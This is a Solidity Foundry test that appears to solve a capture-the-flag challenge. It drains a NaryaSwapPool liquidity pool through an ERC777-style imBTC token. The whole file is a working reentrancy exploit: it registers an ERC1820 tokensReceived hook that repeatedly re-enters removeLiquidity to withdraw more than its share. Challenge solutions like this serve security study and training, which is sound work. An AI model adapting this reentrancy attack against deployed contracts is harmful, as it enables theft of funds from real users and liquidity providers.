// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "./Challange.sol";


contract ContractTest is Test {
    bytes32 constant internal TOKENS_RECIPIENT_INTERFACE_HASH =
        0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b;

    Challenge public chall;
    ERC1820Registry public erc1820Registry;
    NaryaSwapPool public pair;
    IMBTC public imBTC;
    
    uint256 public reentryN = 0;
    uint256 public liquidityR = 0;
    uint256 public liquidityL = 0;

    function testExp() public {
        deal(address(this), 1 ether);
        chall = new Challenge{value: 1 ether}();
        erc1820Registry = ERC1820Registry(chall.erc1820Registry());
        pair = NaryaSwapPool(chall.pair());
        imBTC = IMBTC(chall.imBTC());  


        erc1820Registry.setInterfaceImplementer(
            address(this),
            TOKENS_RECIPIENT_INTERFACE_HASH,
            address(this)
        );

        deal(address(this), 18 ether);

        chall.requestImBTC();
        imBTC.approve(address(pair), type(uint256).max);
        pair.addLiquidityETH{value: 1 ether}(
            18 ether,
            type(uint256).max,
            address(this),
            block.timestamp
        );

        reentryN = 14;
        liquidityR = pair.balanceOf(address(this)) / reentryN;
        liquidityL = pair.balanceOf(address(this)) - liquidityR * reentryN + liquidityR;
        removeLiquidity();
        require(chall.isSolved());
    }
    
    function removeLiquidity() internal {

        if (reentryN == 1) {
            pair.removeLiquidity(liquidityL, address(this), block.timestamp);
        } else {
            pair.removeLiquidity(liquidityR, address(this), block.timestamp);
        }
    }

    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes memory userData,
        bytes memory operatorData
    ) external {
        if (reentryN <= 1) {
            return;
        }
        reentryN -= 1;
        removeLiquidity();
    }

    fallback() external payable {}
    receive() external payable {}

}